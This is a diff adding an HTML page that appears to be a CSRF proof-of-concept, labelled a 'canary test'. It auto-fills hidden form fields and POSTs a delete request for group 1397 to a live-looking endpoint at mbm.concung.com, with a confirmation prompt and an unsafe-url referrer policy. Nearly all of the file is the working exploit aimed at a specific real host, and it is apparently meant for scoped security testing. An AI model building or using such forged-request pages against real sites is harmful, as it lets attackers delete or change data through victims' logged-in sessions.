@@ -1,0 +1,21 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="referrer" content="unsafe-url">
+<title>MBM CSRF canary test</title>
+<body>
+  <h1>MBM group-delete CSRF canary</h1>
+  <p>This targets only the explicitly supplied test group: ID 1397, name <code>test</code>.</p>
+  <form action="https://mbm.concung.com/IMessageGroups/Delete"
+        method="POST"
+        enctype="application/x-www-form-urlencoded"
+        onsubmit="return confirm('Submit the CSRF canary request for group 1397 (test)?');">
+    <input type="hidden" name="IMessageGroupID" value="1397">
+    <input type="hidden" name="GroupID" value="1397">
+    <input type="hidden" name="GroupName" value="test">
+    <input type="hidden" name="IsSystem" value="false">
+    <input type="hidden" name="IsDeleted" value="true">
+    <button type="submit">Run canary request</button>
+  </form>
+</body>
+</html>
